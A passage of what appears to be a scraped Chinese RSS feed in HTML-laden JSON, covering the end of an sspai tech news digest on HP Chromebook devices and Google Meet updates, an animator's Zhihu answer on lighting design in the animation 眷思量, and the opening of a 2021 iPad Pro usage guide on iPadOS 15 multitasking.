一体机，支架上内置音箱，处理器采用英特尔酷睿 i3-10110U，最高可选配 16GB 的内存以及 256GB 的 PCIe NVMe 固态硬盘。售价同样也为 599.99 美元起。同步发布的还有一款 HP M24fd USB-C 显示器，屏幕为 24 英寸的 1080P 屏幕，提供了 65W 快充，支持笔记本电脑设备一线连，售价为 249.99 美元。<a href=\"https://www.theverge.com/2021/8/10/22615788/hp-chromebook-x2-11-chromebase-aio-m24fd-works-with-chromebook-monitor-news-price-specs-features\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6elb34tfv4jeuu00.png\"><figcaption>图片来自新闻源</figcaption></figure><h3>Google Meet 追加新特性</h3>\n<p>8 月 12 日，Google 更新 Google Meet 相关说明，明确将从 8 月 16 日起开始陆续向各平台推送 Google Meet 多项新功能。例如，将参会人数提升至 25 人、支持设定共同主持人、禁止他人发言、限制屏幕共享等等。<a href=\"https://support.google.com/meet/thread/120857872/add-up-to-25-co-hosts-per-meeting-and-expanded-safety-features-for-google-meet\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6etb34tfv4jeuu0g.png\"><figcaption>图片来自新闻源</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>由部分美国参议员提出的新反垄断法案要求 Apple 和 Google 允许在其平台上使用第三方应用商店并旁加载应用，法案中要求 Apple 不得要求开发者只使用自己的内购系统，并且允许开发者以通过其他第三方应用商店来分发应用，这项提案将打破Apple 和 Google 在应用市场的竞争优势，帮助用户获得更多的设备控制权。<a href=\"https://www.macrumors.com/2021/08/11/antitrust-app-store-bill-apple-google/\" target=\"_blank\">来源</a>\n</li>\n<li>数码博主 @数码闲聊站 在微博透露，三星 4nm 的 sm8450 样片测试性能提升 20% 左右。<a href=\"https://weibo.com/6048569942/Kt591lRJ0\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒 kotaku 援引可靠消息来源称，位于苏格兰的工作室 Rockstar Dundee 正在制作三款侠盗猎车手 III<i>、</i>侠盗猎车手罪恶都市以及侠盗猎车手圣安地列斯这三款游戏的重制版，游戏将采用虚幻引擎重新打造，但保留了原先游戏的体验，游戏可能会登陆当前的游戏机主机、PC、移动设备以及 Google Stadia 云游戏平台。<a href=\"https://9to5google.com/2021/08/12/grand-theft-auto-remastered-trilogy-report-stadia/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护议题。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员将获赠该书。</li>\n<li>⭐ 又到开学季，面对刚入学的晚辈和继续求学的朋友送点什么好？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 聊聊。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul><li>🎁️ 少数派商店 <a href=\"https://sspai.com/post/68166\" target=\"_blank\">七夕折扣</a> 进行中，这些好物送 TA 也能送自己。</li></ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67996\" target=\"_blank\">🔗 我们需要什么样的双向链接，它适合你吗？</a></li>\n<li><a href=\"https://sspai.com/post/67887\" target=\"_blank\">💃 摆脱压力、放飞自我——零基础学街舞从寻找工作室开始</a></li>\n<li><a href=\"https://sspai.com/post/68233\" target=\"_blank\">✨ 折叠手机两连发、耳机手表齐升级：三星 Galaxy Unpacked 发布会看点汇总</a></li>\n<li><a href=\"https://sspai.com/post/68227\" target=\"_blank\">🧑‍🎓 开学季 | 这些软件和服务的教育优惠，能帮你省下不少钱</a></li>\n<li><a href=\"https://sspai.com/post/68231\" target=\"_blank\">🥰 成就更多少数派，极客好物体验线下回顾</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68244"},{"title":"如何评价国产动画《眷思量》第十集？","date":"2021-08-12 15:30:09","description":"\n<p>自从上周最后两集特效收完尾，周末头一次花了不少时间在眼睛的康复治疗上，也算趁机多闭目养神休息一下，一直以来为了肝片子平时每天4小时睡眠都保证不了 ，确实扛不住了 ，于是周一又没有完成知乎君的更新任务 orz。。。</p>\n<p>而且这次准备的是一些灯光制作上的，编辑起来确实要多花一些时间，今天项目会也不少，断断续续这会才弄完 。</p>\n<p>下面就来分享下这集光影设计的一些点。</p>\n<p>开篇镜玄披皮救场这段戏，原本中期给的是按实际灯光环境铺的，比较平的光，我希望能显出“恒老”像一道希望之光一样，于是做了相应P图指示，以背光勾边衬托的方式调整了登场思路：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d9677f7a22dc8d795e40faef37db343d_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1119\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d9677f7a22dc8d795e40faef37db343d\" data-watermark-src=\"v2-bba5b19a38bfe6615247b6b2dc9048d2\" data-private-watermark-src=\"v2-2eed85cf990eef33452549e85edeff1a\"></p>\n<p>走进的这里，尤其要衬托出恒老和前后层人物的空间感，以光影分割最为合适。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d78589fa310e5a130fe8548035c7ce10_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1134\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d78589fa310e5a130fe8548035c7ce10\" data-watermark-src=\"v2-405c6b6012aa4c57f27770da43664be5\" data-private-watermark-src=\"v2-268b4833877e011715a2945288486247\"></p>\n<p>同时配合恒老的场光，其他角度也做相应补光。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-291cf4e6d54bdf1633ce8b1d965c3dcc_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1123\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-291cf4e6d54bdf1633ce8b1d965c3dcc\" data-watermark-src=\"v2-5be844cbd8c134f583a4c2c0c5a48206\" data-private-watermark-src=\"v2-51b6b7c332239e30414a70fed3dedf90\"></p>\n<p>但是到了下面这个角度，观察思路又换了一套，从眼睛的自主调节能力去考量，前景人物背光感增强能更凸显空间感以及分割室内气场环境，空气感的表达会更明显。再加入正上方天光和水面光晕反光完成这镜的灯光设计。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-37c9333dc46c890c1fbc958037abb047_720w.jpg?rss\" data-rawwidth=\"1748\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-37c9333dc46c890c1fbc958037abb047\" data-watermark-src=\"v2-e2df58ad11ec2fe694c2917b0a1959d3\" data-private-watermark-src=\"v2-47b5b123c9e5c16200639665a906b5d1\"></p>\n<p>“恒老”到柴房给丽崽松绑这段戏，为了继续贯彻恒老的出现像光一样，以及恒老和长老会叙旧交涉，时间已经过度到快夕阳的时段，这两个隐藏含义，于是开门后，对室内有一个暖光的投射。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9c0c84627ff64aca705361b0558d101a_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2264\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-9c0c84627ff64aca705361b0558d101a\" data-watermark-src=\"v2-a0cb8d30e75396d21131d0c3b8730258\" data-private-watermark-src=\"v2-7d2b282a59719f60f938b288e9a30a93\"></p>\n<p>夕阳登山这场戏，中期原本的灯光时段不太明显，于是P图调整到夕阳氛围，然后又加了云雾，让整座山沐浴在金光里，想表达虽然玄哥在这里生气了，但是出于他内心对丽崽的关心，整个氛围还是充满暖意的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3e7bb301a776275f7df9c26333d59f5_720w.jpg?rss\" data-rawwidth=\"1757\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f3e7bb301a776275f7df9c26333d59f5\" data-watermark-src=\"v2-62bd7d057f9bd24eee1d020d78eb99c1\" data-private-watermark-src=\"v2-db40aab251bd320eb290e50704bd4f3d\"></p>\n<p>以及大家可能以为片中场景原本就是那个样子，其实不全是~有不少是需要确定镜头后，单独针对镜头做细化的。需要出图来配合，然后三维场景组配合资产加细，再渲染出来拿给我审核。这也是平时让我分身乏术的镜头细化工作内容之一 ，比如下面这个例子。为了场景氛围，增加了植被层次，调整了植物形态，替换了天空，调整了光影等。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3dc66e4b8e2ebfb9947a42fd6b3d8424_720w.jpg?rss\" data-rawwidth=\"1801\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3dc66e4b8e2ebfb9947a42fd6b3d8424\" data-watermark-src=\"v2-27dc9b7eccdf7e005511dd5369f6c717\" data-private-watermark-src=\"v2-091eff21b7669aa757684bac23316aff\"></p>\n<p>以及大家也许以为任何灯光下角色都很漂亮，其实也不是，为了让角色们每场戏面部看起来尽量完美，我的要求比较高，需要调整到我满意为止。是需要每场都盯一下的。</p>\n<p>主角们的镜头可能会出现下面的情况，</p>\n<p>1.面光油腻</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e5ad0427506887b2c73ad4871b2d710d_720w.jpg?rss\" data-rawwidth=\"1745\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e5ad0427506887b2c73ad4871b2d710d\" data-watermark-src=\"v2-3bd4bad6b1ca909ff974cdf6f43cf8ae\" data-private-watermark-src=\"v2-26201f1f2636180b27677249d739b4ed\"></p>\n<p>2.补光不够，角色面部暗沉</p>\n<p><img src=\"https://pic1.zhimg.com/v2-af30ad48ebeac240ce282bde1b8abbc7_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2277\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-af30ad48ebeac240ce282bde1b8abbc7\" data-watermark-src=\"v2-dcd2ea951028e344581dcd956210bf15\" data-private-watermark-src=\"v2-7ac4e6c83050d350c2fbe5a115f2e51c\"></p>\n<p>程灼这镜中期给的原灯光较平，不够凸显环境氛围以及程灼此时的心境，所以做了P图修正，这样密林深处的环境氛围也更加明显。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c85e2f64a8d246f334529141c1482390_720w.jpg?rss\" data-rawwidth=\"1333\" data-rawheight=\"2331\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c85e2f64a8d246f334529141c1482390\" data-watermark-src=\"v2-35f70a5988eee09c9fdb70a8999d41f2\" data-private-watermark-src=\"v2-ed3e95eccad003d384ed748906a57a03\"></p>\n<p>好啦！这次先分享这些了，得赶紧奔赴项目会了 ~</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/478348101/answer/2055862496?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">36 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476668782?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第九集？</a><br><a href=\"http://www.zhihu.com/question/340684835?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">国产动画有哪些让你（感动/热血沸腾）的片段？</a><br>\n","link":"http://www.zhihu.com/question/478348101/answer/2055862496?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"iPad 使用指南 2021","date":"2021-08-12 13:15:07","description":"\n<p>今年是我毕业的第五年，也就是说，iPad 已经整整伴随我八年了。我不知道我自己在这八年里是不是有着足够大的进步，但我知道，至少 iPad 变化很多。现在，我正在用 2021 版的 12.9 英寸 iPad Pro 写下这篇文章，我的背包里，还躺着一台 2021 版 11 英寸 iPad Pro。</p>\n<p>显然，我比以前更加依赖 iPad 了。</p>\n<p>这不是我第一次写 iPad Pro 使用指南了，但距离上次写也过了很长时间，iPad 在我的工作和生活中扮演的角色也发生了变化，所以现在也是一个很合适的时间，再来聊一聊这件事。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0d469721fdbbf3e808eb892930317b9b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic4.zhimg.com/v2-0d469721fdbbf3e808eb892930317b9b_r.jpg\"></figure><p>可能是因为年纪开始变大了，我已经不再喜欢和人争论。尤其是当任何场所提起 iPad Pro 的时候，「它是不是生产力工具」这件事已经变得像人类那些无解的永恒命题一样。所以，如果你期待在这篇文章中获得这个问题的答案，你可能要失望了，因为我不会回答。以及如果你看完本文，依然想要评论：</p>\n<p>「iPad Pro 就是没有生产力。」</p>\n<p>那我就说一句你都对吧。</p>\n<p>而如果你并不纠结于此，无论你现在是不是已经拥有了一台 iPad Pro，这篇文章的目的都是为了能够让你和 iPad Pro 找到合适的连接方式。我们都知道苹果设备的包装内都不包含说明书，但我希望这篇文章可以成为 iPad Pro 最好的说明书，而这本说明书并非冰冷的操作手册，而是在你和 iPad Pro 之间，做好人与机器之间的传递语言。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6b7276469b6c4282650373538bcf4ca5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-6b7276469b6c4282650373538bcf4ca5_r.jpg\"></figure><p>在这篇说明书中，我将会从三个角度展开。</p>\n<p>首先是产品的形态，在这一部分中，我会尝试回答「到底什么是 iPad」。</p>\n<p>其次是产品的使用，我尝试分享具体的使用经验，尽可能给出清晰的工作流。</p>\n<p>最后是产品的购买，尤其是针对尺寸、配置和配件给出更为针对性的参考。当然，在这一环节中，我也将会明确指出它现在并不适合哪些工作，避免消费浪费。</p>\n<p>需要说明的是，在 2021 年谈 iPad ，潜台词就应该是 iPad Pro，或者说是指 iPad Pro 配合 Apple Pencil 的这种产品形态。所以在本文中，将会用 iPad 代指 iPad Pro、iPad Air 以及任何能够使用 Apple Pencil 的 iPad。</p>\n<h2>把灵感扣在玻璃里</h2>\n<p>用所谓的「移动设备尺寸」的思维来理解 iPad 是过时的。今天的 iPad 绝不是介于所谓 iPhone 和 Mac 的一种中间形态，更不是乔布斯第一次拿出 iPad 时的客厅之友。尤其是 iPad Pro 产品线的出现让整个产品逻辑都发生了根本性的变化。</p>\n<p>在 iPad Pro 出现之前，它是最好的内容消费工具这是因为它是最为纯粹的以「屏幕」为核心的电子设备。在 iPad 诞生之初因为没有内容输入的压力，所以没有额外的任何内容生产的硬件负担。而今天所有的内容消费基本上都是通过屏幕完成的，所以 iPad 在这方面有着天然的优势。</p>\n<p>无论是电子阅读时代，还是今天的视频内容时代，iPad 系列产品都是体验最为均衡的选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-16c6955fa9bdcb895f6e587c491c5ed3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-16c6955fa9bdcb895f6e587c491c5ed3_r.jpg\"></figure><p>但是自从 iPad Pro 的出现，iPad 就不仅仅需要来完成「内容消费」的工作，它需要进行「内容生产」，但这种生产是需要「输入方式」，而且这种输入方式也是在不断变化的。</p>\n<p>在设计之初，iPad Pro 是利用 Apple Pencil 的「书写输入」进入细分市场。我现在还记忆犹新，2017 年采访设计师、插画师能不能代替数位板时他们还坚定地说不能。但是时间已进入 2018 年，不论是艺术家也好，从业者也好，只要跟绘画相关的行业，人手一台。</p>\n<p>出现这种改变一个很重要的原因是第二代 Apple Pencil 随着 2018 款 iPad Pro 问世。它创新地解决了两个对于触控笔来说最难的问题，充电以及收纳。磁吸附的设计，基本上也引领了后来其它品牌的触控笔解决方案。当然，硬件只是其一，Procreate 的出现也在软件上填补了空白，这款完全为绘画工作者设计的软件，今天几乎成为了绘画工作者的首选。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-e69823b00ce2aa3ef35e866c3ca90510_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-e69823b00ce2aa3ef35e866c3ca90510_r.jpg\"></figure><p>而随着 iPad Pro 被绘画的细分市场认可以后，使用 iPad Pro 的用户数量逐渐增多。尤其这几年 iPad Pro 的硬件设计在整个苹果产品线中都是最为打动人的一个，于是 iPad Pro 开始逐渐进入大众消费市场。当然，并不是人人都是插画家，所以 iPad Pro 需要满足更加多元的内容创作。因此，苹果也为 iPad Pro 带来了传统桌面的输入方式，也就是键鼠。</p>\n<p>首先，iPad Pro 其实一直对于键盘有着很好的支持，甚至是在 iPad 诞生初期就有官方的键盘配件。但是鼠标就不同了，因为这是完全桌面端的交互方式。但苹果依然用自己优秀的软件设计能力，给出了非常出色解决方案，它既保留了一定的触控特性，又不会让你在使用过过程发觉和使用 Mac 的鼠标有何不同。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-874d6698d5a8aa5c78ae7b7de79f625c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-874d6698d5a8aa5c78ae7b7de79f625c_r.jpg\"></figure><p>而键鼠的出现，也终于解决了文字工作者的最后一块心病，终于不用抬手换行了。</p>\n<p>所以这也带来一个很奇特的现象，这就是 iPad Pro 几乎拥有目前市面上所有的「内容输入方式」。它就像是一个变形金刚。</p>\n<p>或者说，是一个积木。</p>\n<p>所以从这个角度出发，iPad Pro 像是一个可以「定制」的电子产品。虽然这样的定制，意味着消费者需要对配件进行选择，但是这也让每一个消费者类别带来最为纯粹的体验。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-02ca6a7d97fec6103bc5a09e8786903d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-02ca6a7d97fec6103bc5a09e8786903d_r.jpg\"></figure><p>比如，如果你只是单纯的内容消费，那么只需要购买 iPad Pro 本体。没有了键盘这些负担，就是最好的「爱奇艺启动器」。</p>\n<p>比如，如果你的工作与「笔」有关，不管是记笔记，还是画画，那么加上一根 Apple Pencil 这又是目前体验最佳的数字组合。尤其是第二代 Apple Pencil 出现，解决了充电和收纳问题以后，是目前唯一选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-82ba870901eee4413ea423b6ae64bd1c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-82ba870901eee4413ea423b6ae64bd1c_r.jpg\"></figure><p>比如，如果你的工作大多数在路上，那么 5G 蜂窝网络配合上妙控键盘可以让你很好的在更加多元的场合中工作。</p>\n<p>而且随着 M1 芯片的加入到 iPad 阵营中，这让 iPad Pro 的未来想象更加多了起来。越来越多的软件开发者很可能会在未来几年里让 iPad Pro 的整个软件生态有新变化。游戏就是一个现成的例子，现在越来越多的「大作」开始在 Mac 和 iPad 双平台发力，我们甚至是已经开始可以用手柄在iPad 上玩「鬼泣」新作。而游玩的方式也很「iPad」，你可以配合主流主机的手柄，让 iPad 本身再化身游戏机。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4b88ab5fb931e832911558557d8f7a7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4991\" data-rawheight=\"3327\" class=\"origin_image zh-lightbox-thumb\" width=\"4991\" data-original=\"https://pic4.zhimg.com/v2-c4b88ab5fb931e832911558557d8f7a7_r.jpg\"></figure><p>这就是为什么我说不要抱着代替 Mac 的心态去看待 iPad Pro。因为某种意义上来说，Mac 的形态只是 iPad Pro 的形态之一。二者最大的差异在于，Mac 依然是传统键鼠输入方式的组合，而 iPad Pro 目前最大也是最为独特的优势是这一根 Apple Pencil。</p>\n<p>对于这根 Apple Pencil 并不是单纯的只为绘画和设计相关服务，而是只要你的工作学习生活中需要「一只笔」，它大概率都是你的最佳选择。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-974bd2282b260b19b333aa57fa72f64e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-974bd2282b260b19b333aa57fa72f64e_r.jpg\"></figure><p>从软件和系统上，iPad 也有着自己的独特之处。我们都知道 iPadOS 本身是由 iPhone 的 iOS 演化而来。所以它本身的风格延续了触控的沙盒机制。最简单的说法就是，它本身是由一个一个 App 为核心组成的生态。因此某种意义上来说，我们能否进行什么样的工作，能够多快的进行工作，都是由某一个 App 决定的。</p>\n<p>这样的沙盒机制有好有坏，坏处就是它缺乏软件之间的联动，使用起来并不自由，但是好处就是它可以让你更加专注，不受打扰。这一点也会在后面的分享中有所展现，你会发现使用 iPad 时，我们更能集中注意力。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5f96e77aaa2d0f18f78e214d748baf6f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-5f96e77aaa2d0f18f78e214d748baf6f_r.jpg\"></figure><p>好了，在认识短暂的认识 iPad 以后，我们就开始进入本篇文章的正题，iPad Pro 使用指南。</p>\n<p>需要说明的是，在使用指南部分，不仅仅是我自己的一些简单经验。因为工作的原因，我也接触到许多不同的 iPad Pro 用户，他们可能是一些艺术家、插画家、电影工作者、学生等等。我也会把他们的一些使用经验糅合其中。</p>\n<p>希望能够对你有所帮助。</p>\n<h3>横、竖都好用</h3>\n<p>在这一部分开始之前，还是需要再进行一次强调：<b>不要抱着用 iPad 代替 Mac 的想法来使用 iPad</b>。</p>\n<p>这还真的不是说，iPad Pro 不能代替 Mac 的一些工作。而是如果你使用 iPad 时，却依然沿用 Mac 的使用习惯和逻辑，自然会遇到各种阻碍。而对于任何一样全新的工具，很多时候固有习惯才是我们最大的障碍。</p>\n<p>说出来你可能不信，现在的很多小孩子，甚至已经不知道什么是键盘和鼠标，面对一块屏幕，他们的第一直觉是上去戳一下。时间在变，事物在变，换个新的方式，也许会给自己带来许多新东西。</p>\n<p>尝试改变，永远比循规蹈矩更有趣。</p>\n<h3>基本使用逻辑</h3>\n<p>通过第一部分的内容，我们已经很明确的知道 iPad 的生态核心是「每一个 App」。所以其实在这一部分的工作流都是围绕某一个 App 展开。而随着这几年 iPadOS 的逐渐进步，尤其是 iPadOS 15 出现以来，多个 App 之间的联动使用也更紧密。所以这也可以让我们的工作流相对变得完整。<br></p>\n<p>所以在具体工作流开始之前，我们先来学习一下 iPadOS 15 中非常重要的 App 之间的联动方式，或者是多任务逻辑。</p>\n<p>注意，本文中所有的操作都是基于 iPadOS 15，目前 iPadOS 15 依然在公测阶段，还没有正式上线。正式版预计会在九月份左右上线，但现在你可以进行升级尝试，从我的数月使用经验来看，已经非常稳定，当然依然具有一定风险，不着急可以等待九月。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>首先我们要用好底部的程序坞（Dock），iPad 的工作流几乎都需要围绕程序坞展开。下图就是我自己配置的 Dock 栏，大致可以放置 20 个软件。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dd0a04b4ece8686d952eeb7e9101bd4c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic1.zhimg.com/v2-dd0a04b4ece8686d952eeb7e9101bd4c_r.jpg\"></figure><p>你可以在阅读这一章节以后，梳理一下自己常用的软件，然后按照使用频率在程序坞中进行排布。为什么说它重要呢，因为在上一代 iPadOS 系统中想要软件分屏，只能是通过唤出程序坞来选择，非不在程序坞软件想要分屏必须在桌面上提前打开。</p>\n<p>在 iPadOS 15 中这一问题得到了改善，现在我们可以直接通过点击屏幕上方的「三个点」来选择不同的分屏方式。这「三个点」我认为非常有必要，因为在以往分屏操作因为没有任何提示，过于抽象，很多人都会认为过于复杂，现在「三个点」出现以后就很直观。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-e7da8380b2ba52d0ab9d635269e48344_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-e7da8380b2ba52d0ab9d635269e48344_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-e7da8380b2ba52d0ab9d635269e48344_r.jpg\"></figure><p>另外，现在的分屏也更加自由。我们可以一个软件多次分屏，比如两篇 Word 文档同时打开。另外在多任务后台中我们还可以更加自由地对于多屏排列自由组合。可以直接通过手指像「上帝一样」改变他们的顺序。</p>\n<p>但分屏如此自由的情况下，程序坞依然重要。因为大多数情况下，最好的方式还是使用程序坞启动分屏，而且如果你想要分屏之后的第三个屏幕，也就是浮窗，依然需要通过唤出程序坞来选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4dcf91d245509bfd8cb52e6d5895d288_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-4dcf91d245509bfd8cb52e6d5895d288_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-4dcf91d245509bfd8cb52e6d5895d288_r.jpg\"></figure><p>浮窗也是一个很容易让人忽视的功能。尤其是如果你是一个在使用某个软件的同时需要多个软件参考的用户，就需要在浮窗上多下点功夫。因为浮窗允许你多个软件堆叠，然后通过像是 iPhone 切换后台一样，直接切换不同的应用参考。</p>\n<p>对了，不同软件之间文件是可以直接拖拽的。这也某种程度上可以增加一些效率。比如我自己给我的文章配图的时候，就可以照片软件里直接拉选。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d2a26e5f6456e9093277e64e79cc85a4_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-d2a26e5f6456e9093277e64e79cc85a4_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-d2a26e5f6456e9093277e64e79cc85a4_r.jpg\"></figure><p>iPadOS 15 另一个便利之处就是，如果你对某个软件进行了分屏操作，系统会自动记忆分屏。当你再次进入软件时，它会给你所有的分屏预览让你选择。所以某种意义上，这也是在记录你的工作流。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b103f29d91a05c825d4e0cbdcae2f1f6_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic3.zhimg.com/v2-b103f29d91a05c825d4e0cbdcae2f1f6_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic3.zhimg.com/v2-b103f29d91a05c825d4e0cbdcae2f1f6_r.jpg\"></figure><p>另外，一些快捷方式也可以让你事半功倍。</p>\n<p><b>键盘快捷键</b></p>\n<p>​如果你同时是 Mac 用户，那么快捷键就相对简单了，因为 iPadOS 和 macOS 的很多快捷键唤出功能是一样的，你可以尝试下。如果你从未接触苹果生态的快捷键也没有关系，iPadOS 15 提供了一个非常直观的快捷键介绍：</p>\n<p>在任意系统中长按 Command 按键，就会显示对应的快捷键列表。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9386245f7931aea2bd419830c03a6d58_b.jpg\" data-caption=\"\" 